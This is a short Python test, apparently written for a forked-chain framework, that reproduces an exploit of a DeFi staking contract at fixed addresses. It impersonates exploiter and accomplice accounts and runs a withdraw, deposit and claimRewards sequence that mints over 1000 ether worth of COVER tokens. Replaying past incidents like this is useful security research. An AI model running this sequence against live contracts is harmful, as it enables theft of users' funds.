def test_exploit(chain, interface, accounts):
    exploiter = accounts.at("0x00007569643bc1709561ec2e86f385df3759e5dd", force=True)
    accomplice = accounts.at("0xdf1aefb979d180b4d67cca9abb4c5108c89dc8a4", force=True)
    bs = interface.Blacksmith("0xe0b94a7bb45dd905c79bb1992c9879f40f1caed5", owner=exploiter)
    bpt = interface.ERC20("0x59686E01Aa841f622a43688153062C2f24F8fDed")
    cover = interface.Cover("0x5d8d9f5b96f4438195be9b99eee6118ed4304286")

    amount = bpt.balanceOf(exploiter)
    drain = bs.miners(bpt, accomplice).dict()["amount"]

    bs.withdraw(bpt, drain, {"from": accomplice})
    bs.deposit(bpt, amount)
    bs.withdraw(bpt, amount - 1)
    chain.sleep(100)
    bs.deposit(bpt, amount - 1)
    bs.claimRewards(bpt)

    print(cover.balanceOf(exploiter).to("ether"))
    assert cover.balanceOf(exploiter) > "1000 ether"
